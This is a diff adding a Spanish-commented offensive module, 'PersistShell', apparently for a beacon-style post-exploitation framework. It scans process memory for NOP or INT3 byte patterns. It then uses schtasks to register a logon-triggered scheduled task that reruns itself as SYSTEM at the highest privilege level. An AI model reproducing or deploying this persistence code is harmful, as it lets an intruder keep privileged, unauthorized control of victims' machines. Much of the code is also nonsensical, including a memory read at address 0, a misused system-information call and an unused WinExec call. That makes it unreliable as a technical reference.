@@ -1,0 +1,67 @@
+/*
+    Módulo: PersistShell
+    Autor: Kanonufo
+    Versión: 1.0
+    Descripción: Este módulo detecta procesos que han ejecutado shellcode y establece persistencia mediante la creación de una tarea programada.
+*/
+
+import beacon;
+import util;
+
+// Función para buscar la ejecución de shellcode en un proceso utilizando syscalls
+function HasExecutedShellcode(pid)
+{
+    local buffer = heap.alloc(4096);
+    local bytesRead;
+
+    // Leer la memoria del proceso utilizando la syscall NtReadVirtualMemory
+    if (syscall("ntdll.NtReadVirtualMemory", pid, 0, buffer, 4096, bytesRead) == 0)
+    {
+        // Convertir el búfer a una cadena hexadecimal
+        local hexString = util.hexdump(buffer, bytesRead);
+
+        // Comprobar si la cadena hexadecimal contiene patrones comunes de shellcode
+        if (hexString.contains("90 90 90") || hexString.contains("CC CC CC"))
+        {
+            return true; // Se encontró un patrón de shellcode
+        }
+    }
+
+    return false; // No se encontró shellcode en el proceso
+}
+
+// Función para crear persistencia utilizando una tarea programada con dinvoke
+function CreateScheduledTask()
+{
+    local cmd = "cmd.exe";
+    local arguments = "/c start /b \"\" \"%COMSPEC%\" /c " + this_script();
+    local taskName = "ShellcodePersistenceTask";
+
+    // Crear una tarea programada utilizando dinvoke
+    local WinExec = dinvoke("kernel32.dll", "WinExec", cmd + " " + arguments, 1);
+    local createTaskCmd = "schtasks /Create /TN \"" + taskName + "\" /TR \"cmd /c " + cmd + " " + arguments + "\" /SC ONLOGON /RU SYSTEM /F /RL HIGHEST /ST 00:00";
+    local output = exec(createTaskCmd);
+    b32.println("Tarea programada creada: " + output);
+}
+
+// Función principal
+function main()
+{
+    // Enumerar todos los procesos utilizando syscalls
+    local processes = syscall("ntdll.NtQuerySystemInformation", 5, 0, 0, 0, 0);
+
+    // Recorrer los procesos
+    foreach pid in processes
+    {
+        // Comprobar si el proceso ha ejecutado shellcode
+        if (HasExecutedShellcode(pid))
+        {
+            b32.println("El proceso " + pid + " ha ejecutado shellcode.");
+
+            // Crear persistencia utilizando una tarea programada con dinvoke
+            CreateScheduledTask();
+        }
+    }
+
+    b32.println("Ejecución del módulo completada.");
+}
